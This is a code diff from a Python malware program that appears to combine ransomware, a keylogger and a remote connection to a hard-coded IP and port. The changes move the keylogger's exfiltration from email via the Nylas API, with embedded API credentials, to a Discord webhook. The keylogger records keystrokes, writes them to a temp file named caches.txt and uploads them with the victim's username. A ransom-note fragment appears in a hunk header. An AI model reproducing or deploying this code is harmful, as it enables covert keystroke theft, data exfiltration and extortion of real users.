@@ -917,14 +917,12 @@ Seems like your files have been encrypted with high grade military encryption. T
 
 #region Keylogger
 class Keylogger: 
-    def __init__(self, interval, reciver_email):
+    def __init__(self, interval, reciver_webhook):
         now             = datetime.datetime.now()
-        self.interval   = int(interval * 3600) # Convert secs to hours
-        self.reciver    = reciver_email
+        self.interval   = int(interval) # Convert secs to hours
+        self.reciver    = DiscordWebhook(url=reciver_webhook, rate_limit_retry=True, username="Keylogger Logs")
         self.log        = ""
         self.dir        = mkdtemp()
-        self.start_dt   = now.strftime('%d/%m/%Y %H:%M')
-        self.end_dt     = now.strftime('%d/%m/%Y %H:%M')
         self.username   = os.getlogin()
 
     def callback(self, event):
@@ -960,45 +958,30 @@ class Keylogger:
         self.log += name
 
     def report_logs(self):
-        nylas = APIClient(
-            "9o14pkk9460r3iqhkrkq73reu",
-            "9k1t8b54p5bt9mlqkii0liv0j",
-            "OiJZqHyaVWmGNi9QlVhYJv1LZOVoIS",
-        )
-        
         flag = False
-        self.end_dt = datetime.datetime.now()
-
         #region Check log length > 2000
-        if len(self.log) > 1990:
+        if len(self.log) < 1990:
             flag = True
+            now = datetime.datetime.now()
             if os.path.exists(os.getenv("TEMP") + "\\caches.txt"): os.remove(os.getenv("TEMP") + "\\caches.txt")
             path = os.getenv("TEMP") + "\\caches.txt"
             with open(path, 'w+') as file:
-                file.write(f"Keylogger Report From {self.username} Time: {self.start_dt}-{self.end_dt}\n\n")
+                file.write(f'Keylogger Report From {self.username} Time: {now.strftime("%d/%m/%Y %H:%M")}\n\n')
                 file.write(self.log)
+                file.close()
 
-            attachment = open(path, 'r')
-            file_ = nylas.files.create()
-            file_.filename = 'logs.txt'
-            file_.stream = attachment
-            file_.save()
-            attachment.close()
-            
-            draft = nylas.drafts.create()
-            draft.subject = f"Time: {self.start_dt}-{self.end_dt}"
-            draft.body = "Check uploaded file for details"
-            draft.to = [{'name': f'Keylogger Report: {self.username}', 'email': self.reciver}]
-            draft.attach(file_)
-            draft.send()
-        
+            embed = DiscordEmbed(title=f"{self.username} Report", description="File uploaded", color='03b2f8')
+            with open(path, "rb") as f: self.reciver.add_file(file=f.read(), filename='logs.txt')
+            embed.set_footer(text=f'Time: {now.strftime("%d/%m/%Y %H:%M")}')
+
         else:
-            draft = nylas.drafts.create()
-            draft.subject = f"Time: {self.start_dt}-{self.end_dt}"
-            draft.body = self.log
-            draft.to = [{'name': f'Keylogger Report: {self.username}', 'email': self.reciver}]
-            draft.send()
+            embed = DiscordEmbed(title=f"{self.username} Report", description=self.log, color='03b2f8')
+            now = datetime.datetime.now()
+            embed.set_footer(text=f'Time: {now.strftime("%d/%m/%Y %H:%M")}')
         #endregion
+
+        self.reciver.add_embed(embed)
+        self.reciver.execute(remove_embeds=True, remove_files=True)
 
         if flag: os.remove(path)
 
@@ -1009,7 +992,6 @@ class Keylogger:
         timer = threading.Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
-        self.start_dt = datetime.datetime.now()                         # Get the current time
 
     def start(self):
         keyboard.on_release(callback=self.callback)                     # Start the keylogger
@@ -1981,7 +1963,7 @@ def kill_zombie():
 
 
 
-ip      = "192.168.0.22"
+ip      = "192.168.0.2"
 port    = 1888
 
 
